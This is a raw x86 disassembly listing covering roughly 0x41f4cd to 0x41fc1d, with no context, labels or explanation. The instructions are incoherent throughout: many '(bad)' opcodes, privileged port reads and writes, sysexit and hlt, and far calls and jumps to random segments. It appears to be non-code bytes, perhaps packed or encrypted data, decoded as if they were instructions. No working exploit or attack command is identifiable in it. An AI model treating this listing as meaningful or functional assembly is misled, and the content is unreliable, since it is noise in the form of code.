  41f4cd:	repz cdq 
  41f4cf:	(bad)  
  41f4d0:	retf   
  41f4d1:	mov    eax,0x407dbc5a
  41f4d6:	imul   edi,esi,0xffffffbb
  41f4d9:	in     eax,dx
  41f4da:	xor    dh,BYTE PTR [ecx-0x17]
  41f4dd:	in     al,dx
  41f4de:	rol    DWORD PTR [esi-0x5f2857a6],1
  41f4e4:	inc    edi
  41f4e5:	push   eax
  41f4e6:	call   0x511dada7
  41f4eb:	test   BYTE PTR [edi],ah
  41f4ed:	xchg   edx,eax
  41f4ee:	xchg   ebx,eax
  41f4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f0:	fst    DWORD PTR [esi+esi*8+0x671619ff]
  41f4f7:	mov    ds:0xe2508727,al
  41f4fc:	sbb    eax,0x1ea5cdc6
  41f501:	out    0xe8,eax
  41f503:	lea    ecx,[ebx+0x2f]
  41f506:	jecxz  0x41f540
  41f508:	clc    
  41f509:	pop    ds
  41f50a:	stos   DWORD PTR es:[edi],eax
  41f50b:	sahf   
  41f50c:	fs mov al,0x53
  41f50f:	mov    dh,0x22
  41f511:	push   esp
  41f512:	nop
  41f513:	pop    ebp
  41f514:	std    
  41f515:	data16 cld 
  41f517:	xchg   al,dh
  41f519:	imul   ebp,DWORD PTR [edi],0x915f18ae
  41f51f:	push   0x49
  41f521:	jp     0x41f4ee
  41f523:	push   cs
  41f524:	(bad)  
  41f525:	leave  
  41f526:	and    BYTE PTR [edi],dl
  41f528:	or     al,0x0
  41f52a:	jecxz  0x41f57a
  41f52c:	xchg   edi,eax
  41f52d:	bound  eax,QWORD PTR [edx-0x2c]
  41f530:	stos   DWORD PTR es:[edi],eax
  41f531:	pusha  
  41f532:	shl    dl,0x46
  41f535:	cmp    esi,ecx
  41f537:	push   eax
  41f538:	and    BYTE PTR [edi],bl
  41f53a:	pop    ebx
  41f53b:	cdq    
  41f53c:	mov    ecx,0x6b76884b
  41f541:	dec    ecx
  41f542:	adc    eax,0x7af78785
  41f547:	aas    
  41f548:	call   0x9e71:0xc06c91ba
  41f54f:	sbb    al,0x28
  41f551:	neg    al
  41f553:	jne    0x41f567
  41f555:	xor    BYTE PTR [edx+edx*1],ah
  41f558:	jae    0x41f5a5
  41f55a:	rcr    DWORD PTR [edx-0x42],cl
  41f55d:	pop    es
  41f55e:	mov    dl,0x85
  41f560:	ror    bl,cl
  41f562:	test   al,0x70
  41f564:	jo     0x41f553
  41f566:	push   ss
  41f567:	sub    BYTE PTR [ecx-0x66713dde],dh
  41f56d:	xchg   esi,eax
  41f56e:	(bad)  
  41f56f:	xor    ch,BYTE PTR [ebx+0x22]
  41f572:	mov    cl,0x1c
  41f574:	pop    esi
  41f575:	sti    
  41f576:	shr    BYTE PTR [edx+0x553691e],1
  41f57c:	or     dl,bh
  41f57e:	mov    edx,0x95fc8aaf
  41f583:	adc    al,0x64
  41f586:	mov    ecx,DWORD PTR [edx]
  41f588:	pop    es
  41f589:	ret    0x6a8d
  41f58c:	imul   ebp,DWORD PTR [eax+0x2f],0xffffffed
  41f590:	lods   al,BYTE PTR ds:[esi]
  41f591:	test   eax,0xd0a5a99f
  41f596:	add    esi,DWORD PTR [eax]
  41f598:	or     ecx,DWORD PTR [edx-0x526ade62]
  41f59e:	dec    ebx
  41f59f:	mov    dh,BYTE PTR [ebx*4+0x7487cf5a]
  41f5a6:	out    dx,al
  41f5a7:	out    dx,eax
  41f5a8:	retf   0xded7
  41f5ab:	jmp    0x8f3b:0xa19ae178
  41f5b2:	push   es
  41f5b3:	bound  edx,QWORD PTR [ebp+0x33]
  41f5b6:	in     al,0x68
  41f5b8:	or     ebp,ebp
  41f5ba:	dec    esp
  41f5bb:	mov    cl,0xd4
  41f5bd:	dec    ecx
  41f5be:	and    eax,0x5435ced1
  41f5c3:	clc    
  41f5c4:	jg     0x41f578
  41f5c6:	jno    0x41f5e1
  41f5c8:	addr16 mov esp,0x79b0f110
  41f5ce:	addr16 push cs
  41f5d0:	(bad)  
  41f5d1:	jecxz  0x41f55c
  41f5d3:	pop    edi
  41f5d4:	fldenv [ebx-0x91798e9]
  41f5da:	xchg   DWORD PTR [ebx+0x75],esp
  41f5dd:	je     0x41f5aa
  41f5df:	stc    
  41f5e0:	out    0x3f,eax
  41f5e2:	clc    
  41f5e3:	jb     0x41f5f0
  41f5e5:	cwde   
  41f5e6:	xchg   ecx,eax
  41f5e7:	jecxz  0x41f5a9
  41f5e9:	mov    bh,0x6e
  41f5eb:	jge    0x41f627
  41f5ed:	loope  0x41f65d
  41f5ef:	(bad)  
  41f5f1:	pop    esp
  41f5f2:	and    DWORD PTR ds:0x62aaf787,0x74192f86
  41f5fc:	push   ebp
  41f5fd:	mov    edi,0xc3331c88
  41f602:	xchg   edx,eax
  41f603:	data16 mov bl,0xd2
  41f606:	into   
  41f607:	ins    BYTE PTR es:[edi],dx
  41f608:	stos   BYTE PTR es:[edi],al
  41f609:	pop    ebp
  41f60a:	test   BYTE PTR [ebp+0x46f9b572],al
  41f610:	xor    bh,ah
  41f612:	loope  0x41f67f
  41f614:	std    
  41f615:	ret    0x3a59
  41f618:	call   0x5136:0x630c
  41f61e:	xchg   edx,eax
  41f61f:	add    eax,DWORD PTR [esp+ebx*1+0x7]
  41f623:	icebp  
  41f624:	test   al,0xf3
  41f626:	cmp    al,0xa2
  41f628:	cld    
  41f629:	stos   BYTE PTR es:[edi],al
  41f62a:	inc    eax
  41f62b:	retf   
  41f62c:	ja     0x41f5b8
  41f62e:	jg     0x41f60f
  41f630:	call   0x70ef:0xe2f90832
  41f637:	stos   DWORD PTR es:[edi],eax
  41f638:	mov    edx,DWORD PTR [edx-0xd]
  41f63b:	addr16 aaa 
  41f63d:	mov    dh,0x86
  41f63f:	loop   0x41f5c1
  41f641:	add    ebx,DWORD PTR [ebp-0xae3fe6f]
  41f647:	xchg   esi,eax
  41f648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f649:	pop    esi
  41f64a:	dec    esi
  41f64b:	sahf   
  41f64c:	jbe    0x41f615
  41f64e:	jmp    0x5543b997
  41f653:	call   0x85ea25c2
  41f658:	imul   edx,DWORD PTR [eax-0x4a],0xd
  41f65c:	arpl   WORD PTR [edx+0x32fd6566],sp
  41f662:	aaa    
  41f663:	dec    ebp
  41f664:	ins    DWORD PTR es:[edi],dx
  41f665:	mov    ebp,0x158bbd67
  41f66a:	dec    ebp
  41f66b:	sbb    BYTE PTR [ecx],ch
  41f66d:	int    0x67
  41f66f:	cmp    eax,DWORD PTR [edx+0x66]
  41f672:	mov    ah,0x8f
  41f674:	in     eax,dx
  41f675:	adc    DWORD PTR [edi+0x10835241],ebx
  41f67b:	jae    0x41f5fe
  41f67d:	jmp    0x7b0f4f06
  41f682:	(bad)  
  41f683:	ss adc esp,edx
  41f686:	loop   0x41f698
  41f688:	enter  0x7977,0x6
  41f68c:	jae    0x41f6e1
  41f68e:	mov    dl,0xff
  41f690:	adc    esi,DWORD PTR ds:0x87947322
  41f696:	inc    ecx
  41f697:	sbb    eax,ecx
  41f699:	bound  esp,QWORD PTR [edx+eiz*2+0x6691290c]
  41f6a0:	push   edx
  41f6a1:	fst    DWORD PTR [edx+0x1d]
  41f6a4:	pop    edx
  41f6a5:	pop    esp
  41f6a6:	push   esi
  41f6a7:	aaa    
  41f6a8:	mov    ds:0xdfcab827,al
  41f6ad:	mov    esp,0xf344af2d
  41f6b2:	dec    esp
  41f6b3:	pop    ds
  41f6b4:	std    
  41f6b5:	rcr    bh,1
  41f6b7:	ret    0xd5f2
  41f6ba:	das    
  41f6bb:	mov    bh,0xb2
  41f6bd:	repz sub ah,BYTE PTR [esp+ecx*4+0x6a]
  41f6c2:	ja     0x41f6dd
  41f6c4:	mov    esp,0xe7fcea28
  41f6c9:	mov    bh,0x8f
  41f6cb:	mov    edx,0xd4057c15
  41f6d0:	add    eax,0xba365079
  41f6d5:	scas   al,BYTE PTR es:[edi]
  41f6d6:	nop
  41f6d7:	jmp    0x41f6fd
  41f6d9:	stc    
  41f6da:	push   ss
  41f6db:	mov    ebp,0x9cd049e6
  41f6e0:	mov    eax,ds:0xa7cadb86
  41f6e5:	adc    eax,0x3df126bc
  41f6ea:	add    cl,BYTE PTR [edi+0x59]
  41f6ed:	and    dl,BYTE PTR [esi-0x15]
  41f6f0:	(bad)
  41f6f4:	outs   dx,DWORD PTR ds:[esi]
  41f6f5:	mov    ecx,0x7f9eaf1a
  41f6fa:	out    dx,eax
  41f6fb:	mov    bh,0xf1
  41f6fd:	popf   
  41f6fe:	packsswb mm3,QWORD PTR fs:[ecx+0x563a20da]
  41f706:	xchg   esi,eax
  41f707:	and    DWORD PTR [esi-0x72],ecx
  41f70a:	pop    esi
  41f70b:	(bad)  
  41f70c:	mov    dl,0x8
  41f70e:	test   DWORD PTR [edi-0x331c58c1],0x9e56d4c1
  41f718:	cs mov ?,esp
  41f71b:	push   es
  41f71c:	lods   eax,DWORD PTR ds:[esi]
  41f71d:	sbb    bh,BYTE PTR [edi]
  41f71f:	icebp  
  41f720:	mov    al,0x24
  41f722:	jne    0x41f6f8
  41f724:	fild   DWORD PTR [ecx]
  41f726:	adc    DWORD PTR ds:[edx-0x4b87277],0xffffffc7
  41f72e:	aas    
  41f72f:	das    
  41f730:	xchg   BYTE PTR [ebp-0x35a146b9],al
  41f736:	cmc    
  41f737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f738:	cli    
  41f739:	jp     0x41f77d
  41f73b:	pushf  
  41f73c:	sar    BYTE PTR [ebx+edi*8+0x1c],cl
  41f740:	fsub   QWORD PTR [esi+0xe93454f]
  41f746:	lock xchg esi,eax
  41f748:	jge    0x41f75f
  41f74a:	loop   0x41f7c1
  41f74c:	mov    WORD PTR [ecx],?
  41f74e:	ficomp WORD PTR [eax]
  41f750:	and    ah,bh
  41f752:	mov    ch,0x4f
  41f754:	outs   dx,BYTE PTR ds:[esi]
  41f755:	xchg   esp,ecx
  41f757:	add    BYTE PTR [esi-0x5e3bbae5],dh
  41f75d:	sbb    BYTE PTR [esi+0x0],ah
  41f760:	push   DWORD PTR [esi+0x47]
  41f763:	push   ebx
  41f764:	loop   0x41f710
  41f766:	mov    ebx,ebp
  41f768:	cmp    eax,0xff165361
  41f76d:	push   eax
  41f76e:	test   eax,0x71709f44
  41f773:	(bad)  
  41f774:	adc    DWORD PTR [edx-0x66],ebp
  41f777:	jmp    0x41f74a
  41f779:	adc    ebp,esi
  41f77b:	mov    esp,0x8f41f923
  41f780:	push   es
  41f781:	inc    eax
  41f782:	ret    
  41f783:	fild   WORD PTR [edi+0x7be2245b]
  41f789:	in     eax,0x95
  41f78b:	add    ch,0xe1
  41f78e:	jo     0x41f7f5
  41f790:	lds    edx,FWORD PTR [eax+0x46]
  41f793:	gs pop ds
  41f795:	push   esi
  41f796:	xchg   BYTE PTR [ebx-0x53],cl
  41f799:	adc    BYTE PTR [ebp+0x1d],cl
  41f79c:	fisubr WORD PTR [edx]
  41f79e:	int3   
  41f79f:	jecxz  0x41f816
  41f7a1:	xchg   ebp,eax
  41f7a2:	fstp   DWORD PTR [ebx+0x27]
  41f7a5:	fist   DWORD PTR [esi-0x37]
  41f7a8:	mov    al,ds:0x474f3f0b
  41f7ad:	add    eax,0x90dc4b6b
  41f7b2:	inc    ecx
  41f7b3:	dec    eax
  41f7b4:	push   0x1ee68884
  41f7b9:	imul   eax,DWORD PTR [ebp+0x47],0xffffff81
  41f7bd:	out    dx,al
  41f7be:	mov    ebp,0xd953cb81
  41f7c3:	popa   
  41f7c4:	push   ebp
  41f7c5:	cli    
  41f7c6:	sub    al,0xd4
  41f7c8:	cli    
  41f7c9:	test   cl,cl
  41f7cb:	add    ebp,ecx
  41f7cd:	push   0xf831edc7
  41f7d2:	adc    ch,BYTE PTR [edx]
  41f7d4:	inc    ebx
  41f7d5:	sbb    DWORD PTR [eax],ebp
  41f7d7:	pop    esp
  41f7d8:	push   edx
  41f7d9:	mov    es,edx
  41f7db:	clc    
  41f7dc:	jb     0x41f7a1
  41f7de:	adc    BYTE PTR [ecx+edx*4],0xd9
  41f7e2:	pop    edi
  41f7e3:	sar    BYTE PTR [esi],cl
  41f7e5:	mov    al,0xbe
  41f7e7:	in     al,0xb6
  41f7e9:	xchg   ecx,eax
  41f7ea:	dec    esp
  41f7eb:	mov    esi,0xd4c2d55b
  41f7f0:	int3   
  41f7f1:	and    BYTE PTR [eax+0x6415c1ae],ch
  41f7f7:	dec    ebx
  41f7f8:	jbe    0x41f85c
  41f7fa:	pop    eax
  41f7fb:	fisttp DWORD PTR [edi-0x7232b6b3]
  41f801:	jmp    0x9de:0xa153
  41f807:	xchg   edx,eax
  41f808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f809:	jo     0x41f7a0
  41f80b:	add    cl,cl
  41f80d:	fnstenv [edi+edi*8]
  41f810:	lods   eax,DWORD PTR ds:[esi]
  41f811:	mov    esi,0x9e8d08c2
  41f816:	loope  0x41f879
  41f818:	xor    al,0x81
  41f81a:	mov    ebx,0xdd345d9
  41f81f:	cmp    al,0xb3
  41f821:	jne    0x41f86f
  41f823:	or     ecx,ebx
  41f825:	in     eax,0x78
  41f827:	xchg   edx,eax
  41f828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f829:	packuswb mm1,mm0
  41f82c:	xlat   BYTE PTR ds:[ebx]
  41f82d:	in     eax,0xcd
  41f82f:	pop    ebx
  41f830:	stc    
  41f831:	(bad)
  41f834:	(bad)  
  41f835:	fsubr  st,st(6)
  41f837:	xlat   BYTE PTR ds:[ebx]
  41f838:	dec    eax
  41f839:	or     bh,bh
  41f83b:	out    dx,eax
  41f83c:	pusha  
  41f83d:	das    
  41f83e:	xchg   DWORD PTR [esi+0x2f1452f],ebx
  41f844:	and    DWORD PTR [eax+0x79],esi
  41f847:	dec    edx
  41f848:	nop
  41f849:	(bad)  
  41f84a:	jmp    0xd1f8:0x3dc02617
  41f851:	mov    ds:0x95cca542,al
  41f856:	and    esi,edi
  41f858:	ss push ds
  41f85a:	aad    0xdc
  41f85c:	xchg   ecx,eax
  41f85d:	fs mov ch,0x87
  41f860:	jo     0x41f802
  41f862:	(bad)  
  41f863:	add    dh,ah
  41f865:	push   ebx
  41f866:	stos   BYTE PTR es:[edi],al
  41f867:	aaa    
  41f868:	(bad)  
  41f869:	aas    
  41f86a:	cmp    ebp,DWORD PTR [eax+0x116675bc]
  41f870:	daa    
  41f871:	sbb    bh,BYTE PTR [edx+0x2fb52d5]
  41f877:	xor    eax,0x1ba40330
  41f87c:	dec    DWORD PTR [ebp+0x2b275b0]
  41f882:	ss cdq 
  41f884:	dec    esp
  41f885:	shl    DWORD PTR [esp+ecx*8-0x605ebb02],1
  41f88c:	stos   BYTE PTR es:[edi],al
  41f88d:	scas   eax,DWORD PTR es:[edi]
  41f88e:	add    DWORD PTR [ecx+0x26],ecx
  41f891:	sub    al,0xe2
  41f893:	pushf  
  41f894:	call   0xc2ece4fb
  41f899:	sbb    bh,BYTE PTR [eax+eiz*8-0x696f7727]
  41f8a0:	mov    bl,0x53
  41f8a2:	ret    
  41f8a3:	inc    esp
  41f8a4:	dec    edx
  41f8a5:	sahf   
  41f8a6:	or     al,0x7b
  41f8a8:	jg     0x41f883
  41f8aa:	push   0x7d
  41f8ac:	pop    esp
  41f8ad:	sbb    edi,DWORD PTR [ebx-0x786d53ee]
  41f8b3:	add    DWORD PTR [ebx],ecx
  41f8b5:	push   0x71d5d4d
  41f8ba:	push   ebx
  41f8bb:	pop    es
  41f8bc:	mov    ds:0xc97a58fa,al
  41f8c1:	(bad)  
  41f8c2:	call   0x1689c49e
  41f8c7:	dec    edx
  41f8c8:	lods   eax,DWORD PTR ds:[esi]
  41f8c9:	shl    DWORD PTR [ecx],1
  41f8cb:	fmul   DWORD PTR [eax+0x1]
  41f8ce:	pop    ecx
  41f8cf:	inc    ecx
  41f8d0:	mov    edi,0xfe91d775
  41f8d5:	jp     0x41f942
  41f8d7:	jnp    0x41f88a
  41f8d9:	ss push cs
  41f8db:	push   0xffffffcf
  41f8dd:	mov    ecx,0x1f9c486f
  41f8e2:	loope  0x41f88e
  41f8e4:	mov    esp,0x528ea29
  41f8e9:	and    edi,DWORD PTR [esi]
  41f8eb:	cmp    cl,cl
  41f8ed:	into   
  41f8ee:	imul   ecx,esp,0x5c266a1d
  41f8f4:	mov    eax,0xb60e55d1
  41f8f9:	call   0xd098:0x6af2c4b9
  41f900:	iret   
  41f901:	lds    ebx,FWORD PTR [ecx+esi*4+0x3b]
  41f905:	sub    al,BYTE PTR [edi-0x5b]
  41f908:	jl     0x41f902
  41f90a:	in     eax,0x6a
  41f90c:	arpl   WORD PTR [ebx-0x46],si
  41f90f:	xchg   ebp,eax
  41f910:	pop    es
  41f911:	iret   
  41f912:	sbb    BYTE PTR [edi-0x32ee1fe6],ah
  41f918:	test   DWORD PTR [edi-0x5f17b0ed],eax
  41f91e:	leave  
  41f91f:	push   ebp
  41f920:	aaa    
  41f921:	jns    0x41f8bb
  41f923:	mov    ebp,0x902324e0
  41f928:	cmc    
  41f929:	lds    ebp,FWORD PTR [edx+ebp*1+0x58]
  41f92d:	ret    
  41f92e:	add    al,0x4d
  41f930:	loop   0x41f992
  41f932:	outs   dx,BYTE PTR ds:[esi]
  41f933:	push   edi
  41f934:	xchg   DWORD PTR [ecx],esp
  41f936:	push   ebx
  41f937:	mov    eax,0x4599f03
  41f93c:	in     eax,dx
  41f93d:	push   0xffffffa3
  41f93f:	sbb    DWORD PTR [ebx-0x75f2019f],0xffffff9d
  41f946:	mov    WORD PTR [esi],?
  41f948:	test   edi,esi
  41f94a:	loop   0x41f8fb
  41f94c:	inc    esi
  41f94d:	ds push edi
  41f94f:	sub    eax,0x28ed74c0
  41f954:	xchg   ecx,eax
  41f955:	retf   
  41f956:	xor    esp,ecx
  41f958:	ret    0xb5d7
  41f95b:	and    al,0xcc
  41f95d:	cmp    edi,DWORD PTR [edx+eiz*1]
  41f960:	stos   BYTE PTR es:[edi],al
  41f961:	popf   
  41f962:	sti    
  41f963:	pop    es
  41f964:	dec    ecx
  41f965:	loopne 0x41f98f
  41f967:	adc    eax,0x5728e5fc
  41f96c:	sti    
  41f96d:	ds imul edi,esp,0xf578f76e
  41f974:	imul   edi
  41f976:	out    dx,eax
  41f977:	fcomp  DWORD PTR [edi-0x532c1445]
  41f97d:	test   BYTE PTR [ebx-0x73ec2c6a],cl
  41f983:	js     0x41f999
  41f985:	push   ebx
  41f986:	aam    0xb0
  41f988:	mov    ds:0xbd7571cd,al
  41f98d:	pop    ds
  41f98e:	retf   
  41f98f:	scas   al,BYTE PTR es:[edi]
  41f990:	push   esi
  41f991:	into   
  41f992:	add    al,0x76
  41f994:	push   es
  41f995:	stos   DWORD PTR es:[edi],eax
  41f996:	leave  
  41f997:	xor    DWORD PTR [ebx],ecx
  41f999:	mov    cl,0x59
  41f99b:	inc    eax
  41f99c:	pop    ds
  41f99d:	adc    eax,0x9834382f
  41f9a2:	aam    0xee
  41f9a4:	inc    ecx
  41f9a5:	adc    eax,0x90d58fea
  41f9aa:	mov    edx,0xa42f1b48
  41f9af:	into   
  41f9b0:	stos   DWORD PTR es:[edi],eax
  41f9b1:	arpl   WORD PTR [edx+0x55bbfeac],bx
  41f9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9b8:	dec    ecx
  41f9ba:	leave  
  41f9bb:	enter  0x30dc,0x6f
  41f9bf:	mov    ecx,0xf9e4851d
  41f9c4:	push   cs
  41f9c5:	(bad)  
  41f9c6:	sbb    BYTE PTR [edx+0x53],ah
  41f9c9:	out    0xcf,al
  41f9cb:	pop    esp
  41f9cc:	dec    ecx
  41f9cd:	add    ebx,esi
  41f9cf:	(bad)  
  41f9d0:	jmp    0x41f958
  41f9d2:	jmp    0x41f982
  41f9d4:	scas   eax,DWORD PTR es:[edi]
  41f9d5:	enter  0x74ac,0xd0
  41f9d9:	or     al,0xb2
  41f9db:	pop    es
  41f9dc:	daa    
  41f9dd:	inc    esp
  41f9de:	mov    eax,ds:0x19501470
  41f9e3:	fstp   TBYTE PTR [edx*8-0x2e99383a]
  41f9ea:	mov    edx,0xe73caaca
  41f9ef:	mov    dh,0xe2
  41f9f1:	repz cmp ah,BYTE PTR [esi+0x2f]
  41f9f5:	mov    ecx,0xce564464
  41f9fa:	div    DWORD PTR ds:0x633a4b79
  41fa00:	inc    ebx
  41fa01:	shl    BYTE PTR [ebp-0x1da4d877],0xb0
  41fa08:	ret    
  41fa09:	sub    dl,0x64
  41fa0c:	mov    ds:0x1f8df44c,al
  41fa11:	mov    dl,0x52
  41fa13:	call   0x109e3939
  41fa18:	sbb    ebp,DWORD PTR [ecx+0x15]
  41fa1b:	jmp    0xd4ef1026
  41fa20:	jge    0x41fa6c
  41fa22:	test   eax,0xbdec8ea3
  41fa27:	call   0x13eb:0x8159d337
  41fa2e:	in     eax,0xd8
  41fa30:	mov    ds:0xcb286483,al
  41fa35:	pop    ebx
  41fa36:	sahf   
  41fa37:	xchg   DWORD PTR [edi],ebp
  41fa39:	mov    BYTE PTR [eax-0x11911220],cl
  41fa3f:	cli    
  41fa40:	out    dx,eax
  41fa41:	lods   al,BYTE PTR ds:[esi]
  41fa42:	loope  0x41fa21
  41fa44:	fdiv   QWORD PTR [edi+edi*4-0x6e]
  41fa48:	inc    edi
  41fa49:	ret    0xc9da
  41fa4c:	cwde   
  41fa4d:	data16 fs das 
  41fa50:	cmp    dh,BYTE PTR [ecx+0x76]
  41fa53:	xchg   esp,eax
  41fa54:	ins    WORD PTR es:[di],dx
  41fa57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa58:	pop    ds
  41fa59:	ror    BYTE PTR [ecx-0x2b],cl
  41fa5c:	fsubr  DWORD PTR [edx]
  41fa5e:	inc    esp
  41fa5f:	and    eax,0xa5da06ff
  41fa64:	add    ecx,ebx
  41fa66:	push   edx
  41fa67:	cmp    DWORD PTR [ebp-0x36be893f],edi
  41fa6d:	stos   DWORD PTR es:[edi],eax
  41fa6e:	stos   BYTE PTR es:[edi],al
  41fa6f:	into   
  41fa70:	imul   edx,DWORD PTR [edx+0x36],0x6e5a6cad
  41fa77:	aam    0x73
  41fa79:	popf   
  41fa7a:	ds mov ecx,0xb94808a5
  41fa80:	pop    ecx
  41fa81:	xlat   BYTE PTR ds:[ebx]
  41fa82:	out    0x74,eax
  41fa84:	pop    edi
  41fa85:	xor    ebp,ebx
  41fa87:	cmp    esi,DWORD PTR [edi-0x223c2917]
  41fa8d:	nop
  41fa8e:	xor    DWORD PTR [edi-0x73298abd],0xffffffde
  41fa95:	cmp    al,bl
  41fa97:	push   0x66
  41fa99:	or     bl,bh
  41fa9b:	ins    BYTE PTR es:[edi],dx
  41fa9c:	repnz push cs
  41fa9e:	fcomi  st,st(1)
  41faa0:	jbe    0x41fa5a
  41faa2:	arpl   bp,bp
  41faa4:	lods   al,BYTE PTR ds:[esi]
  41faa5:	push   ds
  41faa6:	or     eax,eax
  41faa8:	int    0x65
  41faaa:	xchg   esi,eax
  41faab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faac:	mov    BYTE PTR [edi],ah
  41faae:	inc    esp
  41faaf:	(bad)  
  41fab0:	dec    ecx
  41fab1:	xchg   edi,eax
  41fab2:	add    DWORD PTR [edx+eax*4+0x54],esp
  41fab6:	clc    
  41fab7:	jno    0x41fa4a
  41fab9:	cmp    DWORD PTR [ebx-0x48],esi
  41fabc:	dec    esi
  41fabd:	test   eax,0xde0dd40a
  41fac2:	sbb    DWORD PTR [edi+0x2f],0x4d14de5f
  41fac9:	ins    DWORD PTR es:[edi],dx
  41faca:	pop    ds
  41facb:	hlt    
  41facc:	add    al,0xee
  41face:	pop    esp
  41facf:	dec    esp
  41fad0:	test   eax,0xd7141e8f
  41fad5:	mov    bh,0x41
  41fad7:	iret   
  41fad8:	out    dx,al
  41fad9:	sti    
  41fada:	xchg   esi,eax
  41fadb:	(bad)  
  41fadc:	cmc    
  41fadd:	scas   eax,DWORD PTR es:[edi]
  41fade:	call   0x8251:0xe3a29185
  41fae5:	out    0xc6,eax
  41fae7:	xor    DWORD PTR [eax+0xcfd0a13],0x3f38737e
  41faf1:	jae    0x41faf7
  41faf3:	jne    0x41fae3
  41faf5:	scas   eax,DWORD PTR es:[edi]
  41faf6:	add    al,0x2d
  41faf8:	mov    eax,ds:0x6830bee8
  41fafd:	test   edx,ecx
  41faff:	jno    0x41fabc
  41fb01:	stos   BYTE PTR es:[edi],al
  41fb02:	push   esp
  41fb03:	xor    dh,BYTE PTR [ecx+edi*4]
  41fb06:	int3   
  41fb07:	loope  0x41fb52
  41fb09:	popf   
  41fb0a:	in     eax,dx
  41fb0b:	out    0xd9,eax
  41fb0d:	cmp    ebx,DWORD PTR [ebp+ebx*4+0x1a5efb56]
  41fb14:	scas   al,BYTE PTR es:[edi]
  41fb15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb16:	(bad)  
  41fb17:	sti    
  41fb18:	lahf   
  41fb19:	js     0x41fb3c
  41fb1b:	adc    DWORD PTR [eax+0x33d729e4],eax
  41fb21:	xor    BYTE PTR [esp+ebx*8-0x5d],cl
  41fb25:	pop    ds
  41fb26:	push   ds
  41fb27:	lock outs dx,DWORD PTR ds:[esi]
  41fb29:	xorps  xmm1,XMMWORD PTR [ecx]
  41fb2c:	(bad)  
  41fb2d:	repnz aas 
  41fb2f:	arpl   bx,bx
  41fb31:	jo     0x41fb5a
  41fb33:	stos   BYTE PTR es:[edi],al
  41fb34:	es dec eax
  41fb36:	dec    ebx
  41fb37:	xor    dl,BYTE PTR [edi-0x53]
  41fb3a:	loope  0x41fb74
  41fb3c:	fcomp  st(4)
  41fb3e:	inc    edx
  41fb3f:	sysexit 
  41fb41:	outs   dx,DWORD PTR ds:[esi]
  41fb42:	leave  
  41fb43:	fimul  DWORD PTR ds:0xc5f4bb4f
  41fb49:	mov    eax,0xe0338ae7
  41fb4e:	pop    esp
  41fb4f:	xchg   ebp,eax
  41fb50:	ja     0x41fb7b
  41fb52:	xchg   ecx,eax
  41fb53:	loope  0x41fbc7
  41fb55:	outs   dx,BYTE PTR ds:[esi]
  41fb56:	sbb    al,0xf8
  41fb58:	dec    ecx
  41fb59:	inc    ebx
  41fb5a:	rol    DWORD PTR [esp+esi*4],cl
  41fb5d:	mov    dh,0xf
  41fb5f:	aam    0x59
  41fb61:	cli    
  41fb62:	xor    DWORD PTR [edi+0x1e2c36e3],ecx
  41fb68:	sbb    BYTE PTR [ebx],dl
  41fb6a:	jns    0x41fbbe
  41fb6c:	setp   BYTE PTR [edx-0xf]
  41fb70:	push   0xffffff9b
  41fb72:	add    al,0x96
  41fb74:	jne    0x41fb07
  41fb76:	xchg   DWORD PTR [eax],edx
  41fb78:	sbb    edx,DWORD PTR [ebx-0x7a]
  41fb7b:	cli    
  41fb7c:	repnz inc ebx
  41fb7e:	sbb    ebp,DWORD PTR ds:0xa3f9c30a
  41fb84:	dec    eax
  41fb85:	std    
  41fb86:	int    0xc1
  41fb88:	dec    edi
  41fb89:	aad    0xfb
  41fb8b:	cwde   
  41fb8c:	ret    0x23b7
  41fb8f:	xor    bl,0x65
  41fb92:	mov    BYTE PTR [ebp-0x12c2d952],0xf
  41fb99:	mov    bl,0x61
  41fb9b:	scas   eax,DWORD PTR es:[edi]
  41fb9c:	dec    ebx
  41fb9d:	dec    ebp
  41fb9e:	mov    fs,WORD PTR [ebx]
  41fba0:	or     ebp,ebx
  41fba2:	jecxz  0x41fbac
  41fba4:	mov    eax,0x8fedfd4f
  41fba9:	in     eax,0x27
  41fbab:	retf   0x7c78
  41fbae:	mov    eax,ds:0x2ed789d
  41fbb3:	ins    DWORD PTR es:[edi],dx
  41fbb4:	dec    ecx
  41fbb5:	push   eax
  41fbb6:	out    0x7f,al
  41fbb8:	repnz test DWORD PTR [ecx],ebp
  41fbbb:	jb     0x41fbef
  41fbbd:	sub    BYTE PTR [ebp+0x9],al
  41fbc0:	mov    dh,0x87
  41fbc2:	lds    eax,FWORD PTR [ebp+0x1e]
  41fbc5:	stos   DWORD PTR es:[edi],eax
  41fbc6:	js     0x41fc3f
  41fbc8:	pushf  
  41fbc9:	stos   BYTE PTR es:[edi],al
  41fbca:	mov    dl,0xff
  41fbcc:	mov    dl,0xab
  41fbce:	cmc    
  41fbcf:	mov    bh,0x53
  41fbd1:	mov    edi,0x756ece88
  41fbd6:	mov    edx,0x8ddb255d
  41fbdb:	leave  
  41fbdc:	mov    ds:0xa6d28c9e,eax
  41fbe1:	jo     0x41fc36
  41fbe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbe4:	cmp    al,0xef
  41fbe6:	push   ebx
  41fbe7:	fmul   DWORD PTR [ebx]
  41fbe9:	(bad)  
  41fbea:	jp     0x41fc34
  41fbec:	call   0x4d86:0x8f731d0f
  41fbf3:	xor    DWORD PTR [ebp+ecx*1-0x5a],esp
  41fbf7:	xchg   ebx,eax
  41fbf8:	pop    ds
  41fbf9:	aaa    
  41fbfa:	int3   
  41fbfb:	mov    al,ds:0x5e0c26ed
  41fc00:	adc    eax,0xae1d12d8
  41fc05:	or     DWORD PTR [ecx-0x3e],ecx
  41fc08:	xchg   ebx,eax
  41fc09:	aam    0xc1
  41fc0b:	test   eax,0x3204e96d
  41fc10:	inc    edx
  41fc11:	jne    0x41fc45
  41fc13:	jno    0x41fbb6
  41fc15:	mov    esi,DWORD PTR [ecx+edi*4]
  41fc18:	call   0x3b54b483
  41fc1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
